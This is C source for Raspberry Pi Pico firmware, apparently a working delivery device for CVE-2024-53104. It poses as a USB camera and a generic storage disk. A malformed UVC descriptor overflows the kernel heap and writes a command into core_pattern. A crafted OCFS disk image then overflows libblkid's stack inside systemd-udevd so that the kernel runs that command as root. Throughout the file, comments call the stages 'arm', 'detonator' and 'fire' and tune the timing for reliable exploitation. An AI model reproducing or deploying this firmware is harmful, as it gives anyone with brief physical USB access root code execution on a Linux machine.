/*
 * Fido Fidelis — Raspberry Pi Pico/Pico 2 delivery firmware for CVE-2024-53104.
 *
 * The generated malformed UVC configuration descriptor triggers a heap
 * overflow in uvc_parse_format and writes a selected pipe-form command into
 * /proc/sys/kernel/core_pattern. The appended sparse mass-storage function
 * crashes a root systemd-udevd worker, causing the kernel to execute that
 * command as root. Nothing is read back from the target.
 *
 * LED state machine (active-high GPIO25 on Pico and Pico 2 non-W):
 *   OFF          no VBUS / not connected
 *   SLOW BLINK   enumerated, waiting for SET_CONFIGURATION
 *   FAST STROBE  both payload interfaces were parsed; payload execution is
 *                not confirmed
 *   SOS          target re-enumerated after a reboot. Do not disconnect.
 *                Strobe replaces SOS if both interfaces are parsed again.
 */

#include <stdlib.h>
#include <string.h>
#include "pico/stdlib.h"
#include "tusb.h"
#include "device/usbd_pvt.h"   /* usbd_class_driver_t, usbd_app_driver_get_cb */
#include <descriptors.h>

/* ---------- LED on GPIO25 (active-high on Pico/Pico 2 non-W) --------------- */
#define LED_PIN 25

typedef enum {
    LED_OFF,          /* no USB host                                         */
    LED_SLOW_BLINK,   /* enumerated, no SET_CONFIGURATION yet                */
    LED_FAST_STROBE,  /* payload interfaces parsed; enable detonator          */
    LED_SOS,          /* target rebooted; do not fire                         */
} led_state_t;

static volatile led_state_t g_led_state = LED_OFF;

/* ---------- arm state ------------------------------------------------------ */
/* mount_count tracks how many times the host issued SET_CONFIGURATION.
 * >1 means the target rebooted while the Pico remained attached. */
static volatile uint8_t g_mount_count      = 0;
static volatile bool    g_payload_itf_a_ok = false; /* class req on itf 1    */
static volatile bool    g_payload_itf_b_ok = false; /* class req on itf 27   */

/* ---------- interface → descriptor-span table ------------------------------ *
 * Precomputed from the config descriptor. The app driver's open() returns the
 * span for the interface it is being asked to claim.
 *
 * Built by walking arm_config_desc once at init; index is bInterfaceNumber.
 */
static uint16_t g_itf_span[ARM_NUM_INTERFACES];

static void build_itf_span_table(void) {
    const uint8_t *p   = arm_config_desc + 9; /* skip config header */
    const uint8_t *end = arm_config_desc + ARM_CONFIG_DESC_LEN;

    uint8_t  cur_itf    = 0;
    uint16_t cur_offset = 0;
    bool     have_itf   = false;

    while (p < end) {
        uint8_t bl = p[0];
        uint8_t bt = p[1];
        if (bl == 0) break;

        if (bt == 0x04) { /* INTERFACE descriptor */
            if (have_itf && cur_itf < ARM_NUM_INTERFACES) {
                /* close previous interface's span */
                g_itf_span[cur_itf] = (uint16_t)(p - (arm_config_desc + cur_offset));
            }
            cur_itf    = p[2]; /* bInterfaceNumber */
            cur_offset = (uint16_t)(p - arm_config_desc);
            have_itf   = true;

            /* Stop at the first interface that is not the arm's.
             *
             * g_itf_span[] is sized ARM_NUM_INTERFACES. On a composite build
             * the descriptor also carries an appended class function with a
             * higher bInterfaceNumber, and walking into it would write past
             * the end of the array. The appended function is TinyUSB's to
             * claim, not ours, so its span is never needed.
             *
             * This also keeps the final close below from folding the appended
             * descriptors into the last arm interface's span, which would make
             * catchall_open() over-claim and swallow the MSC endpoints. */
            if (cur_itf >= ARM_NUM_INTERFACES) {
                have_itf = false;
                break;
            }
        }
        p += bl;
    }
    /* close last */
    if (have_itf && cur_itf < ARM_NUM_INTERFACES) {
        g_itf_span[cur_itf] = (uint16_t)(end - (arm_config_desc + cur_offset));
    }
}

/* ---------- app driver: claims every interface ----------------------------- */

static void    catchall_init(void) {}
static bool    catchall_deinit(void) { return true; }
static void    catchall_reset(uint8_t rhport) {
    (void)rhport;
    g_payload_itf_a_ok = false;
    g_payload_itf_b_ok = false;
}

static uint16_t catchall_open(uint8_t rhport,
                              tusb_desc_interface_t const *desc_itf,
                              uint16_t max_len) {
    (void)rhport;
    uint8_t itf_num = desc_itf->bInterfaceNumber;
    if (itf_num >= ARM_NUM_INTERFACES) return 0;
    uint16_t span = g_itf_span[itf_num];
    if (span > max_len) return 0;
    return span;
}

/*
 * Handle control transfers on any interface.
 *
 * UVC class requests the target sends after SET_CONFIGURATION:
 *   bmRT  bReq  meaning
 *   0xa1  0x86  GET_INFO
 *   0xa1  0x87  GET_MIN
 *   0xa1  0x81  GET_CUR
 *   0x21  0x01  SET_CUR
 *   0x01  0x0b  SET_INTERFACE
 *
 * For GET_*, return zeroed data of the requested length.
 * For SET_*, accept and discard.
 * For SET_INTERFACE, accept.
 *
 * The critical thing is not stalling — a stall before uvc_parse_format runs
 * would abort the probe. In practice the parse happens inside uvc_probe() and
 * these requests come AFTER, but answering them keeps the driver happy and
 * gives us the signal that both payload interfaces were parsed.
 */
static bool catchall_control_xfer_cb(uint8_t rhport, uint8_t stage,
                                     tusb_control_request_t const *request) {
    if (stage != CONTROL_STAGE_SETUP) return true;

    uint8_t itf = request->wIndex & 0xFF;

    /* Track which payload interfaces got class requests — this is the
     * evidence that uvcvideo parsed both and we can signal "fire". */
    if (itf == ARM_PAYLOAD_ITF_A) g_payload_itf_a_ok = true;
    if (itf == ARM_PAYLOAD_ITF_B) g_payload_itf_b_ok = true;

    uint8_t const bmRT_dir = request->bmRequestType & 0x80;

    if (bmRT_dir) {
        /* IN (device to host): return zeros of the requested length. */
        static uint8_t zbuf[64];
        uint16_t len = request->wLength;
        if (len > sizeof(zbuf)) len = sizeof(zbuf);
        memset(zbuf, 0, len);
        return tud_control_xfer(rhport, request, zbuf, len);
    } else {
        /* OUT (host to device) or zero-length: accept. */
        if (request->wLength) {
            /* Accept the data stage then status. */
            static uint8_t sink[64];
            uint16_t len = request->wLength;
            if (len > sizeof(sink)) len = sizeof(sink);
            return tud_control_xfer(rhport, request, sink, len);
        } else {
            return tud_control_status(rhport, request);
        }
    }
}

static bool catchall_xfer_cb(uint8_t rhport, uint8_t ep_addr,
                              xfer_result_t result, uint32_t xferred_bytes) {
    (void)rhport; (void)ep_addr; (void)result; (void)xferred_bytes;
    return true;
}

static usbd_class_driver_t const catchall_driver = {
    .name             = "catchall",
    .init             = catchall_init,
    .deinit           = catchall_deinit,
    .reset            = catchall_reset,
    .open             = catchall_open,
    .control_xfer_cb  = catchall_control_xfer_cb,
    .xfer_cb          = catchall_xfer_cb,
    .sof              = NULL,
};

usbd_class_driver_t const *usbd_app_driver_get_cb(uint8_t *driver_count) {
    *driver_count = 1;
    return &catchall_driver;
}

/* ---------- mass storage: the detonator ------------------------------------ *
 *
 * Present only on a composite build (descriptors.h generated with --msc).
 *
 * The arm writes a |pipe payload into the kernel's core_pattern. Something
 * then has to take a fatal signal for the kernel to run it. This function is
 * that something: it serves a disk whose ocfs superblock declares a 65535-byte
 * volume label, and libblkid 2.34's probe_ocfs() copies that many bytes out of
 * a 64-byte field in a 132-byte stack struct. systemd-udevd runs that prober
 * IN-PROCESS inside its root worker (60-persistent-storage.rules:109), so the
 * worker dies and the kernel runs our payload as root.
 *
 * do_coredump takes the helper's credentials from prepare_kernel_cred, so the
 * payload runs as full root regardless of the crashing process's uid.
 *
 * The disk is almost entirely imaginary. Only LBA 16 and 17 hold real bytes;
 * every other sector is synthesized as zeros at read time. That is what lets a
 * 4 MB Pico serve a device that must report at least 14,336,000 bytes to clear
 * the prober's minsz.
 */

#if CFG_TUD_MSC

#include "ocfs_image.h"
_Static_assert(OCFS_IMAGE_SIZE == (uint64_t)OCFS_BLOCK_COUNT * OCFS_SECTOR_SIZE,
               "OCFS image geometry is inconsistent");
_Static_assert(OCFS_IMAGE_SIZE >= OCFS_MINSZ,
               "OCFS image is too small for the libblkid probe");

/* Hold the disk "not ready" until both payload interfaces receive class
 * requests. This orders MSC probing after UVC parsing when possible. The
 * timeout prevents permanently withholding storage when those requests do not
 * arrive. */
#define MSC_ARM_GATE_MS 3000

static uint32_t g_first_tur_ms = 0;

static bool arm_delivered(void) {
    return g_payload_itf_a_ok && g_payload_itf_b_ok;
}

bool tud_msc_test_unit_ready_cb(uint8_t lun) {
    (void)lun;
    if (arm_delivered()) return true;

    uint32_t now = to_ms_since_boot(get_absolute_time());
    if (g_first_tur_ms == 0) g_first_tur_ms = now;
    if (now - g_first_tur_ms >= MSC_ARM_GATE_MS) return true;  /* fall back */

    /* NOT READY / "logical unit is in process of becoming ready" -- the sense
     * the kernel retries on, rather than one it gives up on. */
    tud_msc_set_sense(lun, SCSI_SENSE_NOT_READY, 0x04, 0x01);
    return false;
}

void tud_msc_inquiry_cb(uint8_t lun, uint8_t vid[8], uint8_t pid[16], uint8_t rev[4]) {
    (void)lun;
    const char v[] = "Generic ";
    const char p[] = "Mass Storage    ";
    const char r[] = "1.00";
    memcpy(vid, v, 8);
    memcpy(pid, p, 16);
    memcpy(rev, r, 4);
}

void tud_msc_capacity_cb(uint8_t lun, uint32_t *block_count, uint16_t *block_size) {
    (void)lun;
    /* Must stay at or above OCFS_MINSZ or the ocfs prober skips the device
     * entirely and nothing is ever parsed. */
    *block_count = OCFS_BLOCK_COUNT;
    *block_size  = OCFS_SECTOR_SIZE;
}

bool tud_msc_is_writable_cb(uint8_t lun) {
    (void)lun;
    return false;   /* read-only; nothing should ever write to this */
}

bool tud_msc_start_stop_cb(uint8_t lun, uint8_t power_condition,
                           bool start, bool load_eject) {
    (void)lun; (void)power_condition; (void)start; (void)load_eject;
    return true;
}

int32_t tud_msc_read10_cb(uint8_t lun, uint32_t lba, uint32_t offset,
                          void *buffer, uint32_t bufsize) {
    (void)lun;
    uint8_t *out = (uint8_t *)buffer;
    uint64_t pos = (uint64_t)lba * OCFS_SECTOR_SIZE + offset;

    /* Walk byte ranges rather than assuming the request is one aligned sector:
     * TinyUSB may ask for a span that crosses a sector boundary. */
    for (uint32_t done = 0; done < bufsize; ) {
        uint32_t sec_no = (uint32_t)(pos / OCFS_SECTOR_SIZE);
        uint32_t in_sec = (uint32_t)(pos % OCFS_SECTOR_SIZE);
        uint32_t n      = OCFS_SECTOR_SIZE - in_sec;
        if (n > bufsize - done) n = bufsize - done;

        const uint8_t *sec = ocfs_sector_for_lba(sec_no);
        if (sec) memcpy(out + done, sec + in_sec, n);
        else     memset(out + done, 0, n);

        done += n;
        pos  += n;
    }
    return (int32_t)bufsize;
}

int32_t tud_msc_write10_cb(uint8_t lun, uint32_t lba, uint32_t offset,
                           uint8_t *buffer, uint32_t bufsize) {
    (void)lun; (void)lba; (void)offset; (void)buffer;
    /* Read-only. Claim the write succeeded rather than stalling: a write error
     * mid-scan can make the kernel drop the device before blkid ever runs. */
    return (int32_t)bufsize;
}

int32_t tud_msc_scsi_cb(uint8_t lun, uint8_t const scsi_cmd[16],
                        void *buffer, uint16_t bufsize) {
    (void)lun; (void)buffer; (void)bufsize;
    /* Anything TinyUSB did not handle itself. Fail it with ILLEGAL REQUEST /
     * "invalid command operation code" rather than stalling the pipe. */
    tud_msc_set_sense(lun, SCSI_SENSE_ILLEGAL_REQUEST, 0x20, 0x00);
    return -1;
}

#endif /* CFG_TUD_MSC */

/* ---------- TinyUSB descriptor callbacks ----------------------------------- */

uint8_t const *tud_descriptor_device_cb(void) {
    return arm_device_desc;
}

uint8_t const *tud_descriptor_configuration_cb(uint8_t index) {
    (void)index;
    return arm_config_desc;
}

/* String descriptors: index 0 = language, 1 = manufacturer, 2 = product,
 * 3 = serial. */
static uint16_t const lang_desc[] = { 0x0304, 0x0409 };

static void str_to_utf16(const char *s, uint16_t *out) {
    uint8_t len = (uint8_t)strlen(s);
    out[0] = (uint16_t)((TUSB_DESC_STRING << 8) | (2 + 2 * len));
    for (uint8_t i = 0; i < len; i++) {
        out[1 + i] = s[i];
    }
}

uint16_t const *tud_descriptor_string_cb(uint8_t index, uint16_t langid) {
    (void)langid;
    static uint16_t buf[32];

    if (index == 0) return lang_desc;

    switch (index) {
        case 1: str_to_utf16("Probe",             buf); break;
        case 2: str_to_utf16("UVC ModprobeWrite", buf); break;
        case 3: str_to_utf16("ARBWRITE",          buf); break;
        default: return NULL;
    }
    return buf;
}

/* ---------- TinyUSB device callbacks --------------------------------------- */

void tud_mount_cb(void) {
    g_mount_count++;
    if (g_mount_count > 1) {
        /* Re-enumeration indicates a target reboot; do not fire. */
        g_led_state = LED_SOS;
    } else {
        g_led_state = LED_SLOW_BLINK;
    }
}

/* ---------- LED patterns --------------------------------------------------- */

static void led_tick(void) {
    static uint32_t last_ms   = 0;
    static uint8_t  phase     = 0;
    uint32_t now = to_ms_since_boot(get_absolute_time());
    uint32_t dt  = now - last_ms;

    switch (g_led_state) {
    case LED_OFF:
        gpio_put(LED_PIN, 0);
        break;

    case LED_SLOW_BLINK:
        /* 500ms on / 500ms off */
        if (dt >= 500) { last_ms = now; phase ^= 1; }
        gpio_put(LED_PIN, phase & 1);
        break;

    case LED_FAST_STROBE:
        /* 80ms on / 80ms off — unmistakable rapid flash */
        if (dt >= 80) { last_ms = now; phase ^= 1; }
        gpio_put(LED_PIN, phase & 1);
        break;

    case LED_SOS: {
        /* Classic SOS: ...---...  pause */
        static const uint16_t sos_pattern[] = {
            /* S: dit dit dit */
            120, 120, 120, 120, 120, 360,
            /* O: dah dah dah */
            360, 120, 360, 120, 360, 360,
            /* S: dit dit dit */
            120, 120, 120, 120, 120, 700,
        };
        static const uint8_t sos_len = sizeof(sos_pattern)/sizeof(sos_pattern[0]);
        static uint8_t  sos_idx = 0;
        if (dt >= sos_pattern[sos_idx]) {
            last_ms = now;
            sos_idx = (sos_idx + 1) % sos_len;
        }
        /* even indices = LED on (dit/dah), odd = gap */
        gpio_put(LED_PIN, (sos_idx & 1) == 0);
        break;
    }
    }
}

/* ---------- main ----------------------------------------------------------- */

int main(void) {
    /* Board init: clock, GPIO, USB PHY */
    stdio_init_all();

    gpio_init(LED_PIN);
    gpio_set_dir(LED_PIN, GPIO_OUT);
    gpio_put(LED_PIN, 0);

    /* Precompute per-interface descriptor spans */
    build_itf_span_table();

    /* Delay enumeration until the target's USB stack and dependent services
     * have initialized. Enumerating while uvcvideo registers can interfere
     * with built-in camera probing. The LED double-blinks during the delay to
     * distinguish startup from a hang.
     */
    #define BOOT_DELAY_MS  20000
    {
        uint32_t start = to_ms_since_boot(get_absolute_time());
        while (to_ms_since_boot(get_absolute_time()) - start < BOOT_DELAY_MS) {
            uint32_t phase = (to_ms_since_boot(get_absolute_time()) - start) % 2000;
            /* double-blink: on 0-80, off 80-200, on 200-280, off 280-2000 */
            bool on = (phase < 80) || (phase >= 200 && phase < 280);
            gpio_put(LED_PIN, on);
            sleep_ms(10);
        }
        gpio_put(LED_PIN, 0);
    }

    /* Init TinyUSB device stack */
    tud_init(0);

    while (1) {
        tud_task();

        if ((g_led_state == LED_SLOW_BLINK || g_led_state == LED_SOS) &&
            g_payload_itf_a_ok && g_payload_itf_b_ok) {
            g_led_state = LED_FAST_STROBE;
        }

        led_tick();
    }
}
